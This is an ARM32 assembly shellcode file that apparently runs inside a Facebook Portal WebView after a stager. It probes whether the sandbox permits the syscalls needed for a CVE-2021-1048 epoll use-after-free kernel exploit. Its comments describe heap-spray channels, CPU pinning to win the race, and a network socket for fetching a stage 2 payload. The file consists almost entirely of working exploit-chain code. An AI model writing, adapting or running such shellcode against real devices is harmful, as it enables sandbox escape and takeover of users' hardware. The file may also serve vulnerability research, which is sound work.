/*
 * syscall_test.s — Test syscalls needed for CVE-2021-1048 kernel exploit
 * ARM32 EABI shellcode for Facebook Portal captive portal WebView
 *
 * Tests the critical syscalls that the epoll UAF exploit will require:
 *   1. socketpair(AF_UNIX, SOCK_STREAM) — heap spray channel
 *   2. sendmsg(sv[0], 1-byte msg)       — heap spray primitive
 *   3. recvmsg(sv[1], ...)              — data readback
 *   4. clone(SIGCHLD, 0)               — process creation for race
 *   5. sched_setaffinity(0, 8, &mask)  — pin to CPU for race reliability
 *   6. socket(AF_INET, SOCK_STREAM, 0) — test for HTTP download approach
 *
 * Results at wasm_mem + 0x1400 (R11 = results base):
 *   [0x00] socketpair retval    [0x04] sv[0] fd     [0x08] sv[1] fd
 *   [0x0C] sendmsg retval       [0x10] recvmsg retval
 *   [0x14] recvmsg byte value   [0x18] clone retval (child PID or -errno)
 *   [0x1C] wait4 retval         [0x20] sched_setaffinity retval
 *   [0x24] socket(AF_INET) ret  [0x28] bitmap of completed tests
 *
 * Return code in R0: 0xBBxx
 *   xx = bitmap of tests that completed (syscall returned, not SECCOMP-killed)
 *   bit 0 = socketpair   bit 1 = sendmsg    bit 2 = recvmsg
 *   bit 3 = clone         bit 4 = sched_aff  bit 5 = socket(AF_INET)
 *
 * Entry: R4 = wasm_mem (loaded by mprotect_jump stager)
 *
 * Register allocation:
 *   R10 = wasm_mem base (persistent)
 *   R11 = results base = wasm_mem + 0x1400 (persistent)
 *   R9  = bitmap accumulator (persistent)
 *   R4  = sv[0] after socketpair, then reused
 *   R5  = sv[1] after socketpair, then reused
 *   R6  = child PID after clone
 *   R7  = syscall number (per ARM32 EABI)
 *   R8  = scratch
 *
 * Stack layout (FRAME=64 bytes):
 *   SP+0:  sv[0], sv[1]        (8B) socketpair output
 *   SP+8:  iov_base, iov_len   (8B) iovec for sendmsg/recvmsg
 *   SP+16: msghdr               (28B) msg_name..msg_flags
 *   SP+44: timespec             (8B) for nanosleep
 *   SP+52: cpu_mask             (8B) for sched_setaffinity
 *   SP+60: wstatus              (4B) for wait4
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

.equ FRAME, 64

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME
    mov     r10, r4             @ R10 = wasm_mem base
    add     r11, r10, #0x1400   @ R11 = results base
    mov     r9, #0              @ R9 = bitmap (all clear)

    /* ═══════════════════════════════════════════════
     * Test 1: socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, &sv)
     * ═══════════════════════════════════════════════ */
    mov     r0, #1              @ AF_UNIX
    mov     r1, #1              @ SOCK_STREAM
    mov     r2, #0              @ protocol
    add     r3, sp, #0          @ &sv[2] on stack
    movw    r7, #288            @ __NR_socketpair
    svc     #0
    str     r0, [r11, #0x00]    @ store retval
    orr     r9, r9, #1          @ bit 0: socketpair completed
    cmp     r0, #0
    bne     no_sockets          @ failed -> skip sendmsg/recvmsg

    ldr     r4, [sp, #0]        @ R4 = sv[0]
    ldr     r5, [sp, #4]        @ R5 = sv[1]
    str     r4, [r11, #0x04]    @ store sv[0] fd
    str     r5, [r11, #0x08]    @ store sv[1] fd

    /* ═══════════════════════════════════════════════
     * Test 2: sendmsg(sv[0], &msghdr, 0) — send 1 byte
     * ═══════════════════════════════════════════════ */
    /* Set up iovec at SP+8: { wasm_mem+0x1500, 1 } */
    add     r8, r10, #0x1500
    str     r8, [sp, #8]        @ iov_base = wasm_mem+0x1500
    mov     r0, #1
    str     r0, [sp, #12]       @ iov_len = 1
    /* Write test byte 'T' to iov_base */
    mov     r0, #0x54           @ 'T' = 0x54
    strb    r0, [r8]

    /* Set up msghdr at SP+16 (28 bytes) */
    mov     r0, #0
    str     r0, [sp, #16]       @ msg_name = NULL
    str     r0, [sp, #20]       @ msg_namelen = 0
    add     r8, sp, #8
    str     r8, [sp, #24]       @ msg_iov = &iov (SP+8)
    mov     r0, #1
    str     r0, [sp, #28]       @ msg_iovlen = 1
    mov     r0, #0
    str     r0, [sp, #32]       @ msg_control = NULL
    str     r0, [sp, #36]       @ msg_controllen = 0
    str     r0, [sp, #40]       @ msg_flags = 0

    /* sendmsg(sv[0], &msghdr, 0) */
    mov     r0, r4              @ fd = sv[0]
    add     r1, sp, #16         @ msg = &msghdr
    mov     r2, #0              @ flags = 0
    movw    r7, #296            @ __NR_sendmsg
    svc     #0
    str     r0, [r11, #0x0C]    @ store retval
    orr     r9, r9, #2          @ bit 1: sendmsg completed

    /* ═══════════════════════════════════════════════
     * Test 3: recvmsg(sv[1], &msghdr, 0) — recv 1 byte
     * ═══════════════════════════════════════════════ */
    /* Point iov_base to wasm_mem+0x1600 (different location) */
    add     r8, r10, #0x1600
    str     r8, [sp, #8]        @ iov_base = wasm_mem+0x1600
    mov     r0, #1
    str     r0, [sp, #12]       @ iov_len = 1
    /* msg_iov, msg_iovlen still valid from sendmsg setup */
    mov     r0, #0
    str     r0, [sp, #32]       @ msg_control = NULL
    str     r0, [sp, #36]       @ msg_controllen = 0
    str     r0, [sp, #40]       @ msg_flags = 0

    /* recvmsg(sv[1], &msghdr, 0) */
    mov     r0, r5              @ fd = sv[1]
    add     r1, sp, #16         @ msg = &msghdr
    mov     r2, #0              @ flags = 0
    movw    r7, #297            @ __NR_recvmsg
    svc     #0
    str     r0, [r11, #0x10]    @ store retval
    orr     r9, r9, #4          @ bit 2: recvmsg completed

    /* Check received byte — should be 'T' = 0x54 */
    add     r8, r10, #0x1600
    ldrb    r0, [r8]
    str     r0, [r11, #0x14]    @ store received byte value

    /* Close sockets */
    mov     r0, r4              @ close(sv[0])
    mov     r7, #6              @ __NR_close
    svc     #0
    mov     r0, r5              @ close(sv[1])
    mov     r7, #6
    svc     #0
    b       do_clone

no_sockets:
    /* socketpair failed — mark dependent tests as untested */
    mvn     r0, #0              @ -1
    str     r0, [r11, #0x04]    @ sv[0] = -1
    str     r0, [r11, #0x08]    @ sv[1] = -1
    str     r0, [r11, #0x0C]    @ sendmsg = -1
    str     r0, [r11, #0x10]    @ recvmsg = -1
    str     r0, [r11, #0x14]    @ recv byte = -1

do_clone:
    /* ═══════════════════════════════════════════════
     * Test 4: clone(SIGCHLD, 0, 0, 0, 0) — fork
     * Simple fork: child exits immediately, parent waits.
     * Tests whether clone syscall is allowed by SECCOMP.
     * ═══════════════════════════════════════════════ */
    mov     r0, #17             @ flags = SIGCHLD (17)
    mov     r1, #0              @ child_stack = 0 (COW fork)
    mov     r2, #0              @ parent_tidptr = NULL
    mov     r3, #0              @ tls = 0
    mov     r4, #0              @ child_tidptr = NULL
    mov     r7, #120            @ __NR_clone
    svc     #0

    cmp     r0, #0
    beq     child_exit          @ child: R0 = 0 -> exit
    /* Parent or error: R0 = child_pid or -errno */
    str     r0, [r11, #0x18]    @ store clone retval
    orr     r9, r9, #8          @ bit 3: clone completed
    cmp     r0, #0
    ble     do_sched            @ error (negative) -> skip wait

    mov     r6, r0              @ R6 = child PID

    /* nanosleep({0, 50ms}) — give child time to exit */
    mov     r0, #0
    str     r0, [sp, #44]       @ tv_sec = 0
    ldr     r0, lit_50ms
    str     r0, [sp, #48]       @ tv_nsec = 50000000
    add     r0, sp, #44         @ req = &timespec
    mov     r1, #0              @ rem = NULL
    movw    r7, #162            @ __NR_nanosleep
    svc     #0

    /* wait4(child_pid, &wstatus, WNOHANG, NULL) */
    mov     r0, r6              @ pid = child_pid
    add     r1, sp, #60         @ &wstatus
    mov     r2, #1              @ options = WNOHANG
    mov     r3, #0              @ rusage = NULL
    mov     r7, #114            @ __NR_wait4
    svc     #0
    str     r0, [r11, #0x1C]    @ store wait4 retval
    b       do_sched

child_exit:
    /* Child process: exit immediately */
    mov     r0, #0
    mov     r7, #1              @ __NR_exit
    svc     #0
    /* unreachable */

do_sched:
    /* ═══════════════════════════════════════════════
     * Test 5: sched_setaffinity(0, 8, &mask) — pin to CPU 0
     * Useful for increasing race condition reliability.
     * ═══════════════════════════════════════════════ */
    mov     r0, #1              @ CPU 0 bit
    str     r0, [sp, #52]       @ mask[0] = 1 (CPU 0 only)
    mov     r0, #0
    str     r0, [sp, #56]       @ mask[1] = 0
    mov     r0, #0              @ pid = 0 (current process)
    mov     r1, #8              @ cpusetsize = 8 bytes
    add     r2, sp, #52         @ &cpu_mask
    movw    r7, #241            @ __NR_sched_setaffinity
    svc     #0
    str     r0, [r11, #0x20]    @ store retval
    orr     r9, r9, #16         @ bit 4: sched_setaffinity completed

    /* ═══════════════════════════════════════════════
     * Test 6: socket(AF_INET=2, SOCK_STREAM=1, 0)
     * Tests whether we can create network sockets for
     * downloading a larger stage 2 payload over HTTP.
     * ═══════════════════════════════════════════════ */
    mov     r0, #2              @ AF_INET
    mov     r1, #1              @ SOCK_STREAM
    mov     r2, #0              @ protocol = 0
    movw    r7, #281            @ __NR_socket
    svc     #0
    str     r0, [r11, #0x24]    @ store retval
    orr     r9, r9, #32         @ bit 5: socket completed
    cmp     r0, #0
    blt     done                @ negative = error, no fd to close
    /* If we got a valid fd, close it */
    mov     r7, #6              @ __NR_close
    svc     #0

done:
    /* ═══════════════════════════════════════════════
     * Return 0xBBxx where xx = bitmap
     * Store bitmap at results+0x28 too
     * ═══════════════════════════════════════════════ */
    str     r9, [r11, #0x28]    @ store bitmap
    movw    r0, #0xBB00
    orr     r0, r0, r9          @ R0 = 0xBB00 | bitmap
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}

    /* ═══ Literal pool ═══ */
    .align 2
lit_50ms:
    .word   50000000            @ 50ms = 0x02FAF080
